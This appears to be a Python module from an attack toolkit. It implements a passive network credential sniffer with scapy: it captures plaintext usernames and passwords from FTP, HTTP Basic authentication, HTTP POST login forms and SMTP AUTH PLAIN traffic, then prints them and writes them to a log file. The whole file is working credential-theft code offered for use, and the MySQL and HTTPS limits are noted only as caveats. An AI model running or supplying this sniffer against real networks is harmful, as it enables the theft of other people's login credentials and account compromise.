"""
Unified Credential Sniffer — passive capture for FTP, HTTP, SMTP.
For MySQL/HTTPS, explains encryption limitation.
Requires: pip install scapy (sudo/root)
"""
import base64
import re
from urllib.parse import unquote_plus

try:
    from scapy.all import sniff, Raw, IP, TCP
    _SCAPY = True
except Exception:
    _SCAPY = False

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig


_log: str | None = None


def _report(kind, src, user, pw):
    console.print(
        f"\n[bold success]✓ {kind} CREDENTIAL[/bold success]\n"
        f"  [muted]Source :[/muted] [text]{src}[/text]\n"
        f"  [muted]User   :[/muted] [success]{user or '(none)'}[/success]\n"
        f"  [muted]Pass   :[/muted] [success]{pw or '(none)'}[/success]"
    )
    if _log:
        try:
            with open(_log, "a", encoding="utf-8") as fh:
                fh.write(f"[{kind}] {src} user={user} pass={pw}\n")
        except OSError:
            pass


def _handle(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(Raw) and pkt.haslayer(TCP)):
        return
    src = pkt[IP].src
    payload = bytes(pkt[Raw].load).decode("utf-8", errors="replace")

    # ---- FTP ----
    up = payload.upper()
    if up.startswith("USER "):
        console.print(f"[muted]  FTP USER '{payload[5:].strip()}' from {src}[/muted]")
        return
    if up.startswith("PASS "):
        console.print(f"[muted]  FTP PASS '{payload[5:].strip()}' from {src}[/muted]")
        return

    # ---- HTTP Basic ----
    m = re.search(rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)",
                  bytes(pkt[Raw].load), re.I)
    if m:
        try:
            dec = base64.b64decode(m.group(1)).decode("utf-8", "replace")
            if ":" in dec:
                u, p = dec.split(":", 1)
                _report("HTTP-Basic", src, u, p)
                return
        except Exception:
            pass

    # ---- HTTP POST form ----
    if up.startswith(("POST ", "PUT ")):
        body = payload.split("\r\n\r\n", 1)[-1]
        u = p = None
        for k, v in re.findall(
            r"(?i)(username|user|login|email|password|pass|pwd)=([^&\s\r\n]+)",
            body,
        ):
            if k.lower() in ("username", "user", "login", "email"):
                u = unquote_plus(v)
            else:
                p = unquote_plus(v)
        if u or p:
            _report("HTTP-POST", src, u, p)

    # ---- SMTP AUTH ----
    if up.startswith("AUTH LOGIN"):
        return  # base64 pieces follow
    if up.startswith("AUTH PLAIN "):
        try:
            b64 = payload.split(" ", 2)[2].strip()
            dec = base64.b64decode(b64).decode("utf-8", "replace")
            parts = dec.split("\x00")
            if len(parts) >= 3:
                _report("SMTP-AUTH", src, parts[1], parts[2])
        except Exception:
            pass


def run(target: TargetInfo, config: AttackConfig) -> None:
    global _log
    if not _SCAPY:
        console.print("[error]scapy not installed (pip install scapy).[/error]")
        return
    _log = config.log_file
    svc = target.service.lower()

    filters = {
        "ftp":   "tcp port 21",
        "http":  "tcp port 80 or tcp port 8080 or tcp port 8000",
        "https": "tcp port 443 or tcp port 8443",
        "smtp":  "tcp port 25 or tcp port 465 or tcp port 587",
        "mysql": "tcp port 3306 or tcp port 3307",
    }
    bpf = filters.get(svc, f"tcp port {target.port}")

    console.print(
        f"\n[bold primary][ CREDENTIAL SNIFFER — {svc.upper()} ][/bold primary]\n"
        f"  [muted]Filter:[/muted] [text]{bpf}[/text]\n"
    )
    if svc == "mysql":
        console.print(
            "[warning]  Note: MySQL 8+ uses caching_sha2_password — auth is encrypted.\n"
            "  Sniffer captures handshake metadata only (no plaintext password).[/warning]\n"
        )
    elif svc == "https":
        console.print(
            "[warning]  Note: HTTPS is encrypted — sniffer sees SNI hostnames only.[/warning]\n"
        )
    console.print("  [muted]Press Ctrl+C to stop.[/muted]\n")

    try:
        sniff(filter=bpf, prn=_handle, store=False, iface=config.interface)
    except KeyboardInterrupt:
        console.print("\n[warning]  Stopped.[/warning]")
    except PermissionError:
        console.print("[error]  Need root/sudo for raw capture.[/error]")
    except Exception as e:
        console.print(f"[error]  Sniffer error: {e}[/error]")